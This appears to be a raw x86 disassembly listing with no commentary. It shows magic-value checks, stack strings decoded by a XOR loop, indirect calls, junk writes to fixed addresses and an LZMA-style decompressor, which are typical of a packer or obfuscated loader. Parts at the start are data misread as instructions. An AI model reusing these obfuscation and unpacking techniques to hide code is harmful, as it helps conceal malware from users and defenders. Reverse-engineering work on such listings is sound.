  416537:	add    BYTE PTR [eax+eax*2],ah
  41653a:	inc    ebx
  41653b:	add    BYTE PTR [eax],ch
  41653d:	inc    eax
  41653e:	inc    ebx
  41653f:	add    BYTE PTR [eax],al
  416541:	pusha  
  416542:	inc    ebx
  416543:	add    BYTE PTR [eax+eiz*2],al
  416546:	inc    ebx
  416547:	add    BYTE PTR [eax],cl
  416549:	pusha  
  41654a:	inc    ebx
  41654b:	add    BYTE PTR [eax+eiz*2],cl
  41654e:	inc    ebx
  41654f:	add    BYTE PTR [eax],dl
  416551:	pusha  
  416552:	inc    ebx
  416553:	add    BYTE PTR [eax+eiz*2],dl
  416556:	inc    ebx
  416557:	add    BYTE PTR [eax],bl
  416559:	pusha  
  41655a:	inc    ebx
  41655b:	add    BYTE PTR [eax+eiz*2],bl
  41655e:	inc    ebx
  41655f:	add    BYTE PTR [eax],al
  416561:	push   eax
  416562:	inc    ebx
  416563:	add    BYTE PTR [eax+edx*2],al
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax],cl
  416569:	push   eax
  41656a:	inc    ebx
  41656b:	add    BYTE PTR [eax+edx*2],cl
  41656e:	inc    ebx
  41656f:	add    BYTE PTR [eax],dl
  416571:	push   eax
  416572:	inc    ebx
  416573:	add    BYTE PTR [eax+edx*2],dl
  416576:	inc    ebx
  416577:	add    BYTE PTR [eax],bl
  416579:	push   eax
  41657a:	inc    ebx
  41657b:	add    BYTE PTR [eax+edx*2],bl
  41657e:	inc    ebx
  41657f:	add    BYTE PTR [eax],al
  416581:	add    BYTE PTR [eax],al
  416583:	add    al,dl
  416585:	into   
  416586:	xor    BYTE PTR [ebp+0x0],cl
  416589:	add    BYTE PTR [eax],al
  41658b:	add    BYTE PTR [edx],al
  41658d:	add    BYTE PTR [eax],al
  41658f:	add    BYTE PTR ds:0xc0000000,bh
  416595:	add    DWORD PTR gs:[eax],eax
  416598:	rcr    BYTE PTR [ecx+0x1],0x0
  41659c:	add    BYTE PTR [eax+0x43],dh
  41659f:	add    BYTE PTR [eax+esi*2],al
  4165a2:	inc    ebx
  4165a3:	add    BYTE PTR [eax],cl
  4165a5:	jo     0x4165ea
  4165a7:	add    BYTE PTR [eax+esi*2],cl
  4165aa:	inc    ebx
  4165ab:	add    BYTE PTR [eax],dl
  4165ad:	jo     0x4165f2
  4165af:	add    BYTE PTR [eax+esi*2],dl
  4165b2:	inc    ebx
  4165b3:	add    BYTE PTR [eax],bl
  4165b5:	jo     0x4165fa
  4165b7:	add    BYTE PTR [eax+esi*2],bl
  4165ba:	inc    ebx
  4165bb:	add    BYTE PTR [eax],al
  4165bd:	add    BYTE PTR [eax],al
  4165bf:	add    BYTE PTR [edx+0x53],dl
  4165c2:	inc    esp
  4165c3:	push   ebx
  4165c4:	and    ecx,DWORD PTR [ebx-0x5b]
  4165c7:	jne    0x41660d
  4165c9:	ror    DWORD PTR [eax+0x40],1
  4165cc:	or     BYTE PTR [ecx-0x57c6b56],0x34
  4165d3:	push   edi
  4165d4:	add    DWORD PTR [eax],eax
  4165d6:	add    BYTE PTR [eax],al
  4165d8:	inc    ebx
  4165d9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  4165dd:	jb     0x416651
  4165df:	outs   dx,BYTE PTR gs:[esi]
  4165e1:	je     0x416627
  4165e3:	popa   
  4165e4:	je     0x416647
  4165e6:	pop    esp
  4165e7:	dec    ebp
  4165e8:	outs   dx,DWORD PTR ds:[esi]
  4165e9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  4165f1:	ins    BYTE PTR es:[edi],dx
  4165f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4165f9:	dec    esi
  4165fa:	gs ja  0x4165fd
  4165fd:	mov    edx,DWORD PTR [ebp-0x14]
  416600:	sub    esp,0x108
  416606:	push   ebx
  416607:	mov    eax,ebx
  416609:	xchg   ecx,eax
  41660a:	mov    eax,DWORD PTR [ebp+0x8]
  41660d:	cmp    eax,0xf89c8585
  416612:	jne    0x416a95
  416618:	mov    eax,DWORD PTR [ebp+0xc]
  41661b:	cmp    eax,0xf89c8584
  416620:	jne    0x416a95
  416626:	mov    eax,DWORD PTR [ebp+0x24]
  416629:	mov    DWORD PTR [ebp-0x4],eax
  41662c:	mov    BYTE PTR [ebp-0x18],0x1b
  416630:	mov    BYTE PTR [ebp-0x17],0x18
  416634:	mov    BYTE PTR [ebp-0x16],0x5
  416638:	mov    BYTE PTR [ebp-0x15],0x4f
  41663c:	mov    BYTE PTR [ebp-0x14],0x4e
  416640:	mov    BYTE PTR [ebp-0x13],0x7c
  416644:	mov    BYTE PTR [ebp-0x20],0x9
  416648:	mov    BYTE PTR [ebp-0x1f],0xf
  41664c:	mov    BYTE PTR [ebp-0x1e],0x19
  416650:	mov    BYTE PTR [ebp-0x1d],0xe
  416654:	mov    BYTE PTR [ebp-0x1c],0x4f
  416658:	mov    BYTE PTR [ebp-0x1b],0x4e
  41665c:	mov    BYTE PTR [ebp-0x1a],0x7c
  416660:	mov    BYTE PTR [ebp-0x28],0xf
  416664:	mov    BYTE PTR [ebp-0x27],0x4
  416668:	mov    BYTE PTR [ebp-0x26],0x0
  41666c:	mov    BYTE PTR [ebp-0x25],0xb
  416670:	mov    BYTE PTR [ebp-0x24],0x1d
  416674:	mov    BYTE PTR [ebp-0x23],0xc
  416678:	push   esi
  416679:	mov    BYTE PTR [ebp-0x22],0x5
  41667d:	mov    BYTE PTR [ebp-0x21],0x7c
  416681:	xor    esi,esi
  416683:	mov    eax,0xf8
  416688:	lea    ecx,[ebp+esi*1-0x18]
  41668c:	movzx  edx,BYTE PTR [ecx]
  41668f:	xor    edx,0x74
  416692:	add    edx,eax
  416694:	inc    esi
  416695:	mov    BYTE PTR [ecx],dl
  416697:	cmp    esi,0x6
  41669a:	jb     0x416688
  41669c:	xor    esi,esi
  41669e:	lea    ecx,[ebp+esi*1-0x20]
  4166a2:	movzx  edx,BYTE PTR [ecx]
  4166a5:	xor    edx,0x74
  4166a8:	add    edx,eax
  4166aa:	inc    esi
  4166ab:	mov    BYTE PTR [ecx],dl
  4166ad:	cmp    esi,0x7
  4166b0:	jb     0x41669e
  4166b2:	xor    esi,esi
  4166b4:	lea    ecx,[ebp+esi*1-0x28]
  4166b8:	movzx  edx,BYTE PTR [ecx]
  4166bb:	xor    edx,0x74
  4166be:	add    edx,eax
  4166c0:	inc    esi
  4166c1:	mov    BYTE PTR [ecx],dl
  4166c3:	cmp    esi,0x8
  4166c6:	jb     0x4166b4
  4166c8:	lea    eax,[ebp-0x2c]
  4166cb:	mov    DWORD PTR [ebp-0x8],eax
  4166ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4166d1:	mov    eax,0x7113fcef
  4166d6:	mov    DWORD PTR [ecx],eax
  4166d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4166db:	push   edi
  4166dc:	mov    esi,0x4e22
  4166e1:	mov    ebx,0x3272e2
  4166e6:	cmp    ecx,eax
  4166e8:	jne    0x4167b3
  4166ee:	lea    eax,[esi+0x53]
  4166f1:	mov    WORD PTR [ebp-0x78],ax
  4166f5:	mov    eax,esi
  4166f7:	mov    WORD PTR [ebp-0x76],ax
  4166fb:	add    eax,0x5d
  4166fe:	mov    WORD PTR [ebp-0x74],ax
  416702:	lea    eax,[esi+0x1a]
  416705:	mov    WORD PTR [ebp-0x72],ax
  416709:	add    eax,0x41
  41670c:	mov    ecx,eax
  41670e:	lea    eax,[esi+0x15]
  416711:	mov    WORD PTR [ebp-0x66],ax
  416715:	mov    eax,esi
  416717:	mov    WORD PTR [ebp-0x64],ax
  41671b:	add    eax,0x14
  41671e:	mov    WORD PTR [ebp-0x62],ax
  416722:	mov    eax,0x469
  416727:	mov    WORD PTR [ebp-0x60],ax
  41672b:	mov    eax,0x5678
  416730:	mov    WORD PTR [ebp-0x5e],ax
  416734:	mov    eax,0x6118
  416739:	mov    WORD PTR [ebp-0x5c],ax
  41673d:	lea    eax,[ebp-0xe0]
  416743:	push   eax
  416744:	mov    eax,DWORD PTR [ebp+0xc]
  416747:	mov    edi,0x751089b
  41674c:	xor    eax,edi
  41674e:	add    eax,ebx
  416750:	push   eax
  416751:	mov    WORD PTR [ebp-0x70],cx
  416755:	lea    ecx,[esi+0x16]
  416758:	mov    edx,ecx
  41675a:	lea    eax,[ebp-0x78]
  41675d:	push   eax
  41675e:	mov    eax,DWORD PTR [ebp-0x4]
  416761:	mov    eax,DWORD PTR [eax+0x198]
  416767:	mov    WORD PTR [ebp-0x6e],dx
  41676b:	mov    edx,0x4f96
  416770:	mov    WORD PTR [ebp-0x6c],dx
  416774:	mov    DWORD PTR [ebp-0x6a],0x4e7d4e3b
  41677b:	mov    DWORD PTR [ebp-0x5a],0x4e38f10a
  416782:	mov    DWORD PTR [ebp-0xe0],0x1
  41678c:	mov    DWORD PTR [ebp-0xdc],0x255
  416796:	push   DWORD PTR [eax]
  416798:	mov    eax,DWORD PTR [ebp+0x10]
  41679b:	call   eax
  41679d:	mov    DWORD PTR [ebp-0x8],eax
  4167a0:	mov    eax,DWORD PTR [ebp-0x8]
  4167a3:	test   eax,eax
  4167a5:	je     0x4167b8
  4167a7:	xor    DWORD PTR ds:0x76586876,0x87687666
  4167b1:	jmp    0x4167b8
  4167b3:	mov    edi,0x751089b
  4167b8:	mov    eax,DWORD PTR [ebp-0x4]
  4167bb:	mov    ecx,DWORD PTR [eax+0x18c]
  4167c1:	xor    eax,eax
  4167c3:	cmp    DWORD PTR [ecx],eax
  4167c5:	jne    0x416a30
  4167cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4167ce:	mov    ecx,DWORD PTR [ecx+0x17c]
  4167d4:	mov    DWORD PTR [ecx],eax
  4167d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4167d9:	mov    ecx,DWORD PTR [ecx+0x180]
  4167df:	mov    DWORD PTR [ecx],eax
  4167e1:	mov    eax,0x4f8f
  4167e6:	mov    WORD PTR [ebp-0x9c],ax
  4167ed:	mov    eax,esi
  4167ef:	mov    WORD PTR [ebp-0x9a],ax
  4167f6:	mov    eax,0x4e7f
  4167fb:	mov    WORD PTR [ebp-0x98],ax
  416802:	add    eax,0xffffffc0
  416805:	mov    WORD PTR [ebp-0x96],ax
  41680c:	mov    eax,0x4f92
  416811:	mov    WORD PTR [ebp-0x94],ax
  416818:	mov    eax,0x4e3e
  41681d:	mov    WORD PTR [ebp-0x92],ax
  416824:	add    eax,0x3f
  416827:	mov    WORD PTR [ebp-0x90],ax
  41682e:	mov    eax,0x4e38
  416833:	mov    WORD PTR [ebp-0x8e],ax
  41683a:	mov    eax,esi
  41683c:	mov    WORD PTR [ebp-0x8c],ax
  416843:	mov    eax,0x4e3b
  416848:	mov    WORD PTR [ebp-0x8a],ax
  41684f:	mov    eax,0x99ff
  416854:	mov    WORD PTR [ebp-0x88],ax
  41685b:	mov    eax,0x828e
  416860:	mov    WORD PTR [ebp-0x86],ax
  416867:	mov    eax,0xd78d
  41686c:	mov    WORD PTR [ebp-0x84],ax
  416873:	add    eax,0x1c
  416876:	mov    WORD PTR [ebp-0x82],ax
  41687d:	mov    eax,0x27a8
  416882:	mov    WORD PTR [ebp-0x80],ax
  416886:	mov    eax,0x47a8
  41688b:	mov    WORD PTR [ebp-0x7e],ax
  41688f:	mov    eax,0x4e39
  416894:	push   0x8
  416896:	mov    WORD PTR [ebp-0x7c],ax
  41689a:	mov    DWORD PTR [ebp-0x10],0xb00040f
  4168a1:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  4168a8:	lea    eax,[ebp-0x10]
  4168ab:	pop    ecx
  4168ac:	mov    dl,BYTE PTR [eax]
  4168ae:	xor    dl,0x74
  4168b1:	sub    dl,0x8
  4168b4:	mov    BYTE PTR [eax],dl
  4168b6:	inc    eax
  4168b7:	dec    ecx
  4168b8:	jne    0x4168ac
  4168ba:	lea    eax,[ebp-0x10]
  4168bd:	mov    DWORD PTR [ebp-0xdc],eax
  4168c3:	lea    eax,[ebp-0xe0]
  4168c9:	push   eax
  4168ca:	mov    eax,DWORD PTR [ebp+0xc]
  4168cd:	xor    eax,edi
  4168cf:	add    eax,ebx
  4168d1:	push   eax
  4168d2:	mov    eax,DWORD PTR [ebp-0x4]
  4168d5:	add    eax,0x66
  4168d8:	push   eax
  4168d9:	mov    eax,DWORD PTR [ebp-0x4]
  4168dc:	mov    eax,DWORD PTR [eax+0x198]
  4168e2:	mov    DWORD PTR [ebp-0xe0],0x1
  4168ec:	push   DWORD PTR [eax]
  4168ee:	mov    eax,DWORD PTR [ebp+0x10]
  4168f1:	call   eax
  4168f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4168f6:	xor    ecx,edi
  4168f8:	add    ecx,ebx
  4168fa:	mov    DWORD PTR [ebp-0x8],eax
  4168fd:	cmp    eax,ecx
  4168ff:	jne    0x41691a
  416901:	mov    eax,ds:0x33730bee
  416906:	or     eax,0x22150bef
  41690b:	mov    ds:0x33730bee,eax
  416910:	add    eax,0x3372e90f
  416915:	mov    ds:0x33730bee,eax
  41691a:	mov    ecx,0x4f8a
  41691f:	mov    eax,ecx
  416921:	mov    WORD PTR [ebp-0x40],ax
  416925:	mov    eax,0x4e71
  41692a:	mov    edx,eax
  41692c:	mov    WORD PTR [ebp-0x3e],dx
  416930:	lea    edx,[ecx+0xf]
  416933:	mov    WORD PTR [ebp-0x3c],dx
  416937:	add    edx,0xfffffff8
  41693a:	mov    WORD PTR [ebp-0x3a],dx
  41693e:	lea    edx,[ecx+0x9]
  416941:	mov    WORD PTR [ebp-0x38],dx
  416945:	add    edx,0x19
  416948:	mov    WORD PTR [ebp-0x36],dx
  41694c:	lea    edx,[ecx+0x1b]
  41694f:	mov    WORD PTR [ebp-0x34],dx
  416953:	mov    WORD PTR [ebp-0x32],cx
  416957:	mov    ecx,esi
  416959:	mov    WORD PTR [ebp-0x30],cx
  41695d:	lea    ecx,[edx+0x5]
  416960:	mov    edx,ecx
  416962:	mov    WORD PTR [ebp-0x54],dx
  416966:	mov    edx,eax
  416968:	mov    WORD PTR [ebp-0x52],dx
  41696c:	add    edx,0x8
  41696f:	mov    WORD PTR [ebp-0x50],dx
  416973:	mov    WORD PTR [ebp-0x4e],ax
  416977:	add    eax,0x2
  41697a:	mov    WORD PTR [ebp-0x4c],ax
  41697e:	lea    eax,[ecx-0x1e]
  416981:	mov    WORD PTR [ebp-0x4a],ax
  416985:	add    eax,0xfffffff9
  416988:	mov    WORD PTR [ebp-0x48],ax
  41698c:	mov    WORD PTR [ebp-0x46],cx
  416990:	mov    WORD PTR [ebp-0x44],si
  416994:	mov    eax,DWORD PTR [ebp+0x8]
  416997:	movzx  ecx,WORD PTR [ebp-0x54]
  41699b:	xor    eax,edi
  41699d:	add    eax,ebx
  41699f:	xor    eax,ecx
  4169a1:	mov    WORD PTR [ebp-0x54],ax
  4169a5:	mov    eax,DWORD PTR [ebp+0x8]
  4169a8:	movzx  ecx,WORD PTR [ebp-0x40]
  4169ac:	xor    eax,edi
  4169ae:	add    eax,ebx
  4169b0:	xor    eax,ecx
  4169b2:	mov    WORD PTR [ebp-0x40],ax
  4169b6:	xor    eax,eax
  4169b8:	mov    WORD PTR [ebp-0xf4],ax
  4169bf:	mov    WORD PTR [ebp-0x108],ax
  4169c6:	mov    edi,DWORD PTR [ebp+0x24]
  4169c9:	lea    eax,[ebp-0xf4]
  4169cf:	lea    edx,[ebp-0x54]
  4169d2:	mov    DWORD PTR [ebp-0xe0],0x2
  4169dc:	mov    DWORD PTR [ebp-0xdc],eax
  4169e2:	call   0x419373
  4169e7:	mov    DWORD PTR [ebp-0xd8],eax
  4169ed:	lea    eax,[ebp-0xe0]
  4169f3:	push   eax
  4169f4:	mov    eax,DWORD PTR [ebp+0xc]
  4169f7:	xor    eax,0x751089b
  4169fc:	add    eax,ebx
  4169fe:	push   eax
  4169ff:	lea    eax,[ebp-0x9c]
  416a05:	push   eax
  416a06:	push   DWORD PTR [ebp-0x8]
  416a09:	mov    eax,DWORD PTR [ebp+0x10]
  416a0c:	call   eax
  416a0e:	mov    edi,DWORD PTR [ebp+0x24]
  416a11:	lea    eax,[ebp-0x108]
  416a17:	lea    edx,[ebp-0x40]
  416a1a:	mov    DWORD PTR [ebp-0xdc],eax
  416a20:	call   0x419373
  416a25:	mov    DWORD PTR [ebp-0xd8],eax
  416a2b:	mov    edi,0x751089b
  416a30:	mov    eax,DWORD PTR [ebp+0x14]
  416a33:	push   DWORD PTR [ebp-0x4]
  416a36:	push   DWORD PTR [ebp+0x20]
  416a39:	push   DWORD PTR [ebp+0x1c]
  416a3c:	push   DWORD PTR [ebp+0x18]
  416a3f:	push   DWORD PTR [ebp+0x10]
  416a42:	push   DWORD PTR [ebp+0x8]
  416a45:	push   DWORD PTR [ebp+0xc]
  416a48:	call   0x417bef
  416a4d:	test   eax,eax
  416a4f:	je     0x416a93
  416a51:	add    DWORD PTR [ebp-0x4],eax
  416a54:	push   DWORD PTR [ebp-0x4]
  416a57:	lea    esi,[ebp+0x4]
  416a5a:	call   0x416e83
  416a5f:	mov    eax,DWORD PTR [ebp-0x4]
  416a62:	mov    eax,DWORD PTR [eax+0x1c8]
  416a68:	mov    eax,DWORD PTR [eax]
  416a6a:	xor    eax,edi
  416a6c:	add    eax,ebx
  416a6e:	mov    eax,DWORD PTR [ebp-0x4]
  416a71:	jne    0x416a89
  416a73:	mov    ecx,DWORD PTR [ebp-0x4]
  416a76:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416a7c:	push   DWORD PTR [ecx]
  416a7e:	mov    eax,DWORD PTR [eax+0x1d8]
  416a84:	call   DWORD PTR [eax+0x28]
  416a87:	jmp    0x416a93
  416a89:	mov    eax,DWORD PTR [eax+0x17c]
  416a8f:	mov    eax,DWORD PTR [eax]
  416a91:	add    DWORD PTR [esi],eax
  416a93:	pop    edi
  416a94:	pop    esi
  416a95:	pop    ebx
  416a96:	leave  
  416a97:	ret    0x20
  416a9a:	push   edi
  416a9b:	push   esi
  416a9c:	push   ebx
  416a9d:	push   ebp
  416a9e:	mov    ebp,esp
  416aa0:	mov    eax,DWORD PTR [ebp+0x24]
  416aa3:	add    DWORD PTR [ebp+0x28],eax
  416aa6:	push   eax
  416aa7:	cld    
  416aa8:	mov    esi,DWORD PTR [ebp+0x18]
  416aab:	add    DWORD PTR [ebp+0x1c],esi
  416aae:	push   esi
  416aaf:	mov    esi,DWORD PTR [ebp+0x14]
  416ab2:	lods   eax,DWORD PTR ds:[esi]
  416ab3:	xchg   edx,eax
  416ab4:	push   edx
  416ab5:	mov    cl,BYTE PTR [esi-0x2]
  416ab8:	or     eax,0xffffffff
  416abb:	shl    eax,cl
  416abd:	not    eax
  416abf:	push   eax
  416ac0:	mov    cl,dh
  416ac2:	or     eax,0xffffffff
  416ac5:	shl    eax,cl
  416ac7:	not    eax
  416ac9:	push   eax
  416aca:	add    cl,dl
  416acc:	mov    edi,esi
  416ace:	sub    esp,0xc
  416ad1:	sub    eax,eax
  416ad3:	inc    eax
  416ad4:	push   eax
  416ad5:	push   eax
  416ad6:	push   eax
  416ad7:	push   eax
  416ad8:	push   eax
  416ad9:	push   edi
  416ada:	sub    esi,esi
  416adc:	push   esi
  416add:	or     ebx,0xffffffff
  416ae0:	mov    eax,0x300
  416ae5:	shl    eax,cl
  416ae7:	lea    ecx,[eax+0x736]
  416aed:	mov    eax,0x4000400
  416af2:	shr    ecx,1
  416af4:	rep stos DWORD PTR es:[edi],eax
  416af6:	push   0x5
  416af8:	pop    ecx
  416af9:	call   0x416de4
  416afe:	loop   0x416af9
  416b00:	lea    esi,[esi]
  416b02:	lea    edi,[edi]
  416b04:	mov    edi,DWORD PTR [ebp-0x4]
  416b07:	mov    eax,DWORD PTR [ebp-0x10]
  416b0a:	sub    edi,DWORD PTR [ebp+0x24]
  416b0d:	and    eax,edi
  416b0f:	mov    DWORD PTR [ebp-0x18],eax
  416b12:	mov    al,0x0
  416b14:	call   0x416dfc
  416b19:	jne    0x416bb4
  416b1f:	mov    cl,BYTE PTR [ebp-0xc]
  416b22:	and    edi,DWORD PTR [ebp-0x14]
  416b25:	shl    edi,cl
  416b27:	sub    cl,0x8
  416b2a:	neg    cl
  416b2c:	shr    esi,cl
  416b2e:	pop    eax
  416b2f:	add    edi,esi
  416b31:	pop    esi
  416b32:	lea    edi,[edi+edi*2]
  416b35:	shl    edi,0x8
  416b38:	cmp    al,0x7
  416b3a:	pop    edx
  416b3b:	lea    ecx,[esi+edi*2+0xe6c]
  416b42:	push   ecx
  416b43:	push   esi
  416b44:	mov    esi,0x100
  416b49:	push   eax
  416b4a:	mov    al,0x1
  416b4c:	jb     0x416b82
  416b4e:	mov    edi,DWORD PTR [ebp-0x4]
  416b51:	sub    edi,DWORD PTR [ebp-0x24]
  416b54:	movzx  edi,BYTE PTR [edi]
  416b57:	mov    ebp,DWORD PTR [ebp-0x34]
  416b5a:	shl    edi,1
  416b5c:	mov    ecx,esi
  416b5e:	and    esi,edi
  416b60:	add    ecx,esi
  416b62:	lea    ebp,[ebp+ecx*2+0x0]
  416b66:	call   0x416e1b
  416b6b:	mov    ecx,eax
  416b6d:	shr    esi,0x8
  416b70:	and    ecx,0x1
  416b73:	cmp    esi,ecx
  416b75:	mov    esi,0x100
  416b7a:	jne    0x416b8a
  416b7c:	cmp    eax,esi
  416b7e:	jb     0x416b57
  416b80:	jmp    0x416b96
  416b82:	mov    ebp,DWORD PTR [ebp-0x34]
  416b85:	call   0x416e1b
  416b8a:	inc    eax
  416b8b:	inc    esi
  416b8c:	sub    eax,0x1
  416b8f:	sub    esi,0x1
  416b92:	cmp    eax,esi
  416b94:	jb     0x416b82
  416b96:	pop    edx
  416b97:	inc    edx
  416b98:	cmp    edx,0x5
  416b9b:	dec    edx
  416b9c:	mov    ecx,edx
  416b9e:	jb     0x416baf
  416ba0:	inc    edx
  416ba1:	cmp    edx,0xb
  416ba4:	dec    edx
  416ba5:	mov    cl,0x4
  416ba7:	dec    cl
  416ba9:	jb     0x416baf
  416bab:	mov    cl,0x7
  416bad:	dec    cl
  416baf:	sub    edx,ecx
  416bb1:	push   edx
  416bb2:	jmp    0x416c03
  416bb4:	mov    al,0xc1
  416bb6:	dec    al
  416bb8:	call   0x416e0c
  416bbd:	jne    0x416bd3
  416bbf:	pop    eax
  416bc0:	pop    edi
  416bc1:	pop    edx
  416bc2:	pop    ecx
  416bc3:	pop    edx
  416bc4:	pop    ecx
  416bc5:	push   DWORD PTR [esp]
  416bc8:	push   ecx
  416bc9:	push   edx
  416bca:	mov    edx,0x664
  416bcf:	mov    cl,0x0
  416bd1:	jmp    0x416c46
  416bd3:	mov    al,0xcd
  416bd5:	dec    al
  416bd7:	call   0x416e0c
  416bdc:	jne    0x416c0c
  416bde:	mov    al,0xf1
  416be0:	dec    al
  416be2:	call   0x416dfc
  416be7:	jne    0x416c3c
  416be9:	pop    eax
  416bea:	cmp    al,0x7
  416bec:	mov    al,0x9
  416bee:	jb     0x416bf2
  416bf0:	mov    al,0xb
  416bf2:	push   eax
  416bf3:	mov    esi,DWORD PTR [ebp-0x4]
  416bf6:	sub    esi,DWORD PTR [ebp-0x24]
  416bf9:	cmp    esi,DWORD PTR [ebp+0x24]
  416bfc:	jb     0x416dd3
  416c02:	lods   al,BYTE PTR ds:[esi]
  416c03:	mov    edi,DWORD PTR [ebp-0x4]
  416c06:	stos   BYTE PTR es:[edi],al
  416c07:	jmp    0x416d9a
  416c0c:	mov    al,0xd8
  416c0e:	call   0x416e0c
  416c13:	mov    esi,DWORD PTR [ebp-0x28]
  416c16:	je     0x416c33
  416c18:	mov    al,0xe4
  416c1a:	call   0x416e0c
  416c1f:	mov    esi,DWORD PTR [ebp-0x2c]
  416c22:	je     0x416c2d
  416c24:	mov    esi,DWORD PTR [ebp-0x30]
  416c27:	mov    ecx,DWORD PTR [ebp-0x2c]
  416c2a:	mov    DWORD PTR [ebp-0x30],ecx
  416c2d:	mov    ecx,DWORD PTR [ebp-0x28]
  416c30:	mov    DWORD PTR [ebp-0x2c],ecx
  416c33:	mov    ecx,DWORD PTR [ebp-0x24]
  416c36:	mov    DWORD PTR [ebp-0x28],ecx
  416c39:	mov    DWORD PTR [ebp-0x24],esi
  416c3c:	pop    eax
  416c3d:	pop    edi
  416c3e:	pop    ecx
  416c3f:	mov    edx,0xa68
  416c44:	mov    cl,0x8
  416c46:	add    edx,edi
  416c48:	push   edx
  416c49:	push   edi
  416c4a:	cmp    al,0x7
  416c4c:	mov    al,cl
  416c4e:	jb     0x416c52
  416c50:	add    al,0x3
  416c52:	push   eax
  416c53:	mov    ebp,DWORD PTR [ebp-0x34]
  416c56:	call   0x416e19
  416c5b:	jne    0x416c71
  416c5d:	mov    eax,DWORD PTR [ebp-0x18]
  416c60:	mov    edi,DWORD PTR [ebp-0x34]
  416c63:	shl    eax,0x3
  416c66:	sub    ecx,ecx
  416c68:	push   0x8
  416c6a:	pop    esi
  416c6b:	lea    edi,[edi+eax*2+0x4]
  416c6f:	jmp    0x416ca6
  416c71:	mov    ebp,DWORD PTR [ebp-0x34]
  416c74:	add    ebp,0x2
  416c77:	call   0x416e19
  416c7c:	jne    0x416c96
  416c7e:	mov    eax,DWORD PTR [ebp-0x18]
  416c81:	mov    edi,DWORD PTR [ebp-0x34]
  416c84:	shl    eax,0x3
  416c87:	push   0x8
  416c89:	pop    ecx
  416c8a:	push   0x8
  416c8c:	pop    esi
  416c8d:	lea    edi,[edi+eax*2+0x104]
  416c94:	jmp    0x416ca6
  416c96:	mov    edi,0x204
  416c9b:	add    edi,DWORD PTR [ebp-0x34]
  416c9e:	push   0x10
  416ca0:	pop    ecx
  416ca1:	mov    esi,0x100
  416ca6:	mov    DWORD PTR [ebp-0x1c],ecx
  416ca9:	sub    eax,eax
  416cab:	inc    eax
  416cac:	mov    ebp,edi
  416cae:	call   0x416e1b
  416cb3:	mov    ecx,eax
  416cb5:	sub    ecx,esi
  416cb7:	jb     0x416cac
  416cb9:	add    DWORD PTR [ebp-0x1c],ecx
  416cbc:	cmp    DWORD PTR [ebp-0x3c],0x4
  416cc0:	jae    0x416d76
  416cc6:	add    DWORD PTR [ebp-0x3c],0x7
  416cca:	mov    ecx,DWORD PTR [ebp-0x1c]
  416ccd:	cmp    ecx,0x4
  416cd0:	jb     0x416cd5
  416cd2:	push   0x3
  416cd4:	pop    ecx
  416cd5:	mov    edi,DWORD PTR [ebp-0x38]
  416cd8:	shl    ecx,0x6
  416cdb:	sub    eax,eax
  416cdd:	inc    eax
  416cde:	push   0x40
  416ce0:	pop    esi
  416ce1:	lea    edi,[edi+ecx*2+0x360]
  416ce8:	mov    ebp,edi
  416cea:	call   0x416e1b
  416cef:	mov    ecx,eax
  416cf1:	sub    ecx,esi
  416cf3:	jb     0x416ce8
  416cf5:	mov    DWORD PTR [ebp-0x18],ecx
  416cf8:	mov    DWORD PTR [ebp-0x24],ecx
  416cfb:	cmp    ecx,0x4
  416cfe:	jb     0x416d73
  416d00:	mov    esi,ecx
  416d02:	and    DWORD PTR [ebp-0x24],0x1
  416d06:	shr    esi,1
  416d08:	or     DWORD PTR [ebp-0x24],0x2
  416d0c:	dec    esi
  416d0d:	cmp    ecx,0xe
  416d10:	jae    0x416d2b
  416d12:	mov    eax,0x2af
  416d17:	sub    eax,ecx
  416d19:	mov    ecx,esi
  416d1b:	shl    BYTE PTR [ebp-0x24],cl
  416d1e:	add    eax,DWORD PTR [ebp-0x24]
  416d21:	shl    eax,1
  416d23:	add    eax,DWORD PTR [ebp-0x38]
  416d26:	mov    DWORD PTR [ebp-0x34],eax
  416d29:	jmp    0x416d58
  416d2b:	sub    esi,0x4
  416d2e:	call   0x416dd8
  416d33:	shr    ebx,1
  416d35:	shl    DWORD PTR [ebp-0x24],1
  416d38:	cmp    DWORD PTR [ebp-0x20],ebx
  416d3b:	jb     0x416d43
  416d3d:	inc    DWORD PTR [ebp-0x24]
  416d40:	sub    DWORD PTR [ebp-0x20],ebx
  416d43:	dec    esi
  416d44:	jne    0x416d2e
  416d46:	mov    eax,0x644
  416d4b:	add    eax,DWORD PTR [ebp-0x38]
  416d4e:	mov    DWORD PTR [ebp-0x34],eax
  416d51:	shl    DWORD PTR [ebp-0x24],0x4
  416d55:	push   0x4
  416d57:	pop    esi
  416d58:	sub    edi,edi
  416d5a:	inc    edi
  416d5b:	mov    eax,edi
  416d5d:	mov    ebp,DWORD PTR [ebp-0x34]
  416d60:	call   0x416e1b
  416d65:	test   al,0x1
  416d67:	je     0x416d6c
  416d69:	or     DWORD PTR [ebp-0x24],edi
  416d6c:	shl    edi,1
  416d6e:	dec    esi
  416d6f:	jne    0x416d5d
  416d71:	jmp    0x416d73
  416d73:	inc    DWORD PTR [ebp-0x24]
  416d76:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d79:	add    ecx,0x2
  416d7c:	mov    edi,DWORD PTR [ebp-0x4]
  416d7f:	mov    eax,edi
  416d81:	sub    eax,DWORD PTR [ebp+0x24]
  416d84:	cmp    DWORD PTR [ebp-0x24],eax
  416d87:	ja     0x416dd3
  416d89:	mov    esi,edi
  416d8b:	sub    esi,DWORD PTR [ebp-0x24]
  416d8e:	mov    edx,DWORD PTR [ebp+0x28]
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	stos   BYTE PTR es:[edi],al
  416d93:	cmp    edi,edx
  416d95:	jae    0x416d9a
  416d97:	dec    ecx
  416d98:	jne    0x416d91
  416d9a:	mov    DWORD PTR [ebp-0x4],edi
  416d9d:	movzx  esi,al
  416da0:	cmp    edi,DWORD PTR [ebp+0x28]
  416da3:	jb     0x416b04
  416da9:	call   0x416dd8
  416dae:	sub    eax,eax
